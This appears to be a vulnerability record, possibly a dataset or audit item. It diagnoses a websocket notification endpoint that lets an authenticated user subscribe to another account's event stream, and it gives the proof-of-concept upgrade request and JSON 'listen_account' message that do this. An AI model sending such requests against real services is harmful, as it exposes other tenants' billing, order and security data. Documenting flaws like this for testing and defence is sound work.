diagnosis: The notification socket authenticates the connection, but processes 'listen_account' instructions from incoming JSON messages without validating that target_account matches auth_user.account_id. An attacker can bind their websocket connection to another company's account event stream, receiving real-time billing, order, and security alerts.
exploit_request:
GET /ws/notifications HTTP/1.1
Host: api.example.com
Upgrade: websocket
Connection: Upgrade
Authorization: Bearer <user_jwt>

{"action": "listen_account", "account_id": 4920}
